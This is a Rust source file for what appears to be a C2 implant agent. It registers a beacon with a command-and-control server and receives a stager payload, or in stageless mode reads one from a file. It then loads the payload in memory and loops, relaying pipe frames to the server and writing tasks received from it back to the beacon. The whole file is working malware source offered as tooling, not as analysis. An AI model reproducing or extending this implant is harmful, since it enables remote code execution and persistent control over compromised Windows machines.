use std::time::Duration;

use tokio::time::sleep;
use uuid::Uuid;
use windows::Win32::Foundation::HANDLE;

mod beacon;
mod config;
mod transports;
mod utils;

// ── Stager mode ─────────────────────────────────────────────────────────
#[cfg(feature = "stager")]
async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transports::Transport), Box<dyn std::error::Error>> {
    // Register with C2 and get a transport handle
    let transport = utils::register_beacon(beacon_id).await?;

    // Wait for the stager payload
    println!("[-] agent: Waiting for stager...");
    let mut tasks = utils::recv_data(&transport).await?;

    let stager: Vec<u8> = tasks
        .drain(..)
        .next()
        .ok_or("no stager received")?;

    println!("[+] agent: Got a stager! loading...");
    sleep(Duration::from_secs(2)).await;

    // Start beacon using pure Rust implementation (no DLL needed)
    let handle = beacon::start_beacon(&stager)?;

    // Grabbing and relaying the metadata from the SMB pipe is done during interact()
    println!("[+] agent: Loaded, and got handle to beacon. Getting METADATA.");

    Ok((handle, transport))
}

// ── Stagless mode ───────────────────────────────────────────────────────
#[cfg(feature = "stagless")]
async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transports::Transport), Box<dyn std::error::Error>> {
    // Read payload bytes from file
    println!("[-] agent: Reading payload from {}...", config::PAYLOAD_FILE);
    let stager: Vec<u8> = utils::read_file(config::PAYLOAD_FILE).await?;
    println!("[+] agent: Got payload! ({} bytes), loading...", stager.len());

    sleep(Duration::from_secs(2)).await;

    // Start beacon using pure Rust implementation (no DLL needed)
    let handle = beacon::start_beacon(&stager)?;

    // Register with C2 and get a transport handle
    let transport = utils::register_beacon(beacon_id).await?;

    Ok((handle, transport))
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

    let beacon_id = Uuid::new_v4().to_string();
    let (handle, transport) = init_stage(&beacon_id).await?;

    // interact loop
    loop {
        sleep(Duration::from_secs(config::SLEEP_TIME)).await;

        // Read a frame from the beacon pipe
        let chunk = beacon::read_frame(handle)?;

        if chunk.is_empty() {
            println!("[-] pipe: Read 0 bytes");

            // pipe return 0 byte while stagless
            #[cfg(feature = "stager")]
                break;
        }

        println!("[+] pipe: Received {} bytes from pipe", chunk.len());
        println!("[+] server: Relaying chunk to server");
        utils::send_data(&transport, &chunk).await?;

        // Check for new tasks from transport
        println!("[-] server: Checking for new tasks from transport");

        let new_tasks = utils::recv_data(&transport).await?;
        for new_task in new_tasks {
            println!("[+] server: Got new task ({} bytes)", new_task.len());
            println!("[+] pipe: Writing {} bytes to pipe", new_task.len());

            let r = beacon::write_frame(handle, &new_task)?;
            println!("[+] pipe: Wrote {} bytes to pipe", r);
        }
    }

    #[allow(unreachable_code)]
    Ok(())
}
